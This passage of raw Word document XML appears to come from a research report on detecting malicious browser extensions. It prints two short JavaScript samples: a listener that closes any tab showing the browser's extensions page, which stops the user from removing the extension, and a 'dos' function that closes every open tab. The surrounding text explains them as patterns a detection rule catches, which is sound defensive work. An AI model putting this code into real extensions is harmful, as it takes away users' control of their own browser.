                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>remove</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(tab.id)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>} )</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B8142A">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="67EFBB7E" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00B8142A" w:rsidRDefault="006A6E3D" w:rsidP="00B8142A">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="5FC8C819" w14:textId="4C152AC0" w:rsidR="006A6E3D" w:rsidRPr="00B8142A" w:rsidRDefault="006A6E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552D20" id="_x0000_s1030" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:1.05pt;margin-top:44.05pt;width:465.75pt;height:129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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="687D857D" w14:textId="717D1DDE" w:rsidR="006A6E3D" w:rsidRDefault="006A6E3D" w:rsidP="00B8142A">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>chrome.tabs</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>.onUpdated.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>addListener</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(tabid</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>x</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>tab){</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>if</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">(tab.url == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">'chrome://chrome/extensions' </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>||</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   tab.url == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">'opera://extensions' </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>||</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   tab.url == </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>'chrome://extensions/'</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>chrome.tabs.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>remove</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(tab.id)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>} )</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B8142A">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="67EFBB7E" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00B8142A" w:rsidRDefault="006A6E3D" w:rsidP="00B8142A">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="5FC8C819" w14:textId="4C152AC0" w:rsidR="006A6E3D" w:rsidRPr="00B8142A" w:rsidRDefault="006A6E3D"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="001175B2">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 1: Denying the access to Chrome’s extensions configuration page.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="153"/>
    </w:p>
    <w:p w14:paraId="735CB757" w14:textId="5B7C97F4" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="154" w:name="_Ref514843975"/>
      <w:bookmarkStart w:id="155" w:name="_Toc523071579"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>: Access to Chrome’s extensions configuration page.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="154"/>
      <w:bookmarkEnd w:id="155"/>
    </w:p>
    <w:p w14:paraId="46F267BC" w14:textId="0F155AE2" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidDel="00FA79D4" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="156" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>This rule detects denial of service that targets the extensions configuration page. The malicious code uses a listener to detect URLs the user visits. When it is the configuration page for the extensions, it automatically removes the specific tab. As a result, the user is not able to disable or remove any extension installed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C827D1F" w14:textId="3E538C28" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00FA79D4">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:pPrChange w:id="157" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:42:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="158" w:name="_Toc523071515"/>
    <w:p w14:paraId="49E566DC" w14:textId="2634AC48" w:rsidR="009E02A4" w:rsidRDefault="00A87DC2" w:rsidP="00967A35">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251656192" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="06B37727" wp14:editId="4B18F02E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>right</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>476250</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5934075" cy="14668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466850"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="5F869BDB" w14:textId="66F40FEC" w:rsidR="006A6E3D" w:rsidRPr="00581271" w:rsidRDefault="006A6E3D" w:rsidP="00967A35">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">function </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>dos</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>() {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  chrome.tabs.query({}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(tabs) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    tabs.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>forEach</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(tab) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      chrome.tabs.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="FFC66D"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>remove</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>(tab.id)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>})</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">  </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>})</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="00581271">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="24"/>
                                <w:szCs w:val="24"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3C13BB0F" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00967A35">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                                <w:sz w:val="22"/>
                                <w:szCs w:val="22"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1A37F834" w14:textId="1EF9D254" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D">
                            <w:pPr>
                              <w:rPr>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B37727" id="_x0000_s1031" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:416.05pt;margin-top:37.5pt;width:467.25pt;height:115.5pt;z-index:2516561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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5F869BDB" w14:textId="66F40FEC" w:rsidR="006A6E3D" w:rsidRPr="00581271" w:rsidRDefault="006A6E3D" w:rsidP="00967A35">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">function </w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>dos</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">  </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>chrome.tabs.query</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>({}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(tabs) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>tabs.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>forEach</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(tab) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>chrome.tabs.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="FFC66D"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>remove</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>(tab.id)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">    </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                        <w:t>})</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
